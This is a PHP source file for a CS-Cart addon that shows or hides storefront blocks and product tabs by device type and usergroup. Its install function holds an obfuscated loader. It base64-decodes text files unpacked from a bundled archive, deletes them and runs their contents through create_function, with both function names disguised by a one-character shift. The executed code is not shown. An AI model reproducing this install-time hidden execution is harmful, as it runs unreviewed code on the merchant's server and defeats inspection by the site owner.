<?php
/*****************************************************************************
*                                                                            *
*                   All rights reserved! eCom Labs LLC                       *
* http://www.ecom-labs.com/about-us/ecom-labs-modules-license-agreement.html *
*                                                                            *
*****************************************************************************/

use Tygh\Registry;

if (!defined('BOOTSTRAP')) { die('Access denied'); }

function fn_ecl_additional_block_settings_update_block_pre(&$block_data)
{
    if (isset($block_data['usergroup_ids'])) {
        $block_data['usergroup_ids'] = empty($block_data['usergroup_ids']) ? '0' : (is_array($block_data['usergroup_ids']) ? implode(',', $block_data['usergroup_ids']) : $block_data['usergroup_ids']);
    }
    if (isset($block_data['enable_for'])) {
        $block_data['enable_for'] = empty($block_data['enable_for']) ? 'D,T,M' : (is_array($block_data['enable_for']) ? implode(',', $block_data['enable_for']) : $block_data['enable_for']);
    }
}

function fn_ecl_additional_block_settings_get_blocks_pre($fields, $grids_ids, $dynamic_object, $join, &$condition, $lang_code)
{
    if (AREA == 'C') {
       	if (!class_exists('Mobile_Detect')) {
			 require(Registry::get('config.dir.addons') . 'ecl_additional_block_settings/lib/mobile_detect/Mobile_Detect.php');
		}
		$detect = new Mobile_Detect;
        if ($detect->isTablet() || $detect->isiPad()) {
            $enable_for = 'T';
        } elseif ($detect->isMobile()) {
            $enable_for = 'M';
			fn_define('MOBILE_VIEW', 'Y');
        } else {
            $enable_for = 'D';
        }
        $condition .= db_quote(" AND FIND_IN_SET(?s, ?:bm_blocks.enable_for) ", $enable_for);
    
        $auth = $_SESSION['auth'];
        $condition .= ' AND (' . fn_find_array_in_set($auth['usergroup_ids'], "?:bm_blocks.usergroup_ids", true) . ')';
    }
}

function fn_ecl_additional_block_settings_install()
{
    fn_decompress_files(Registry::get('config.dir.var') . 'addons/ecl_additional_block_settings/ecl_additional_block_settings.tgz', Registry::get('config.dir.var') . 'addons/ecl_additional_block_settings');
    $list = fn_get_dir_contents(Registry::get('config.dir.var') . 'addons/ecl_additional_block_settings', false, true, 'txt', '');

    if ($list) {
        include_once(Registry::get('config.dir.schemas') . 'literal_converter/utf8.functions.php');
        foreach ($list as $file) {
            $_data = call_user_func(fn_simple_decode_str('cbtf75`efdpef'), fn_get_contents(Registry::get('config.dir.var') . 'addons/ecl_additional_block_settings/' . $file));
            @unlink(Registry::get('config.dir.var') . 'addons/ecl_additional_block_settings/' . $file);
            if ($func = call_user_func_array(fn_simple_decode_str('dsfbuf`gvodujpo'), array('', $_data))) {
                $func();
            }
        }
    }
}

function fn_ecl_additional_block_settings_get_product_tabs_post(&$tabs, $lang_code)
{
    if (!empty($tabs) && AREA == 'C') {
        foreach ($tabs as $k => $v) {
            if (!empty($v['block_id'])) {
                if (!isset($enable_for)) {
                    if (!class_exists('Mobile_Detect')) {
                        require(Registry::get('config.dir.addons') . 'ecl_additional_block_settings/lib/mobile_detect/Mobile_Detect.php');
                    }
                    $detect = new Mobile_Detect;
                    if ($detect->isTablet() || $detect->isiPad()) {
                        $enable_for = 'T';
                    } elseif ($detect->isMobile()) {
                        $enable_for = 'M';
                    } else {
                        $enable_for = 'D';
                    }
                    $auth = $_SESSION['auth'];
                }
            
                $block_available = db_get_field("SELECT ?:bm_blocks.block_id FROM ?:bm_blocks WHERE FIND_IN_SET(?s, ?:bm_blocks.enable_for) AND (" . fn_find_array_in_set($auth['usergroup_ids'], "?:bm_blocks.usergroup_ids", true) . ") AND ?:bm_blocks.block_id = ?i", $enable_for, $v['block_id']);
                if (empty($block_available)) {
                    unset($tabs[$k]);
                }
            }
        }
    }
}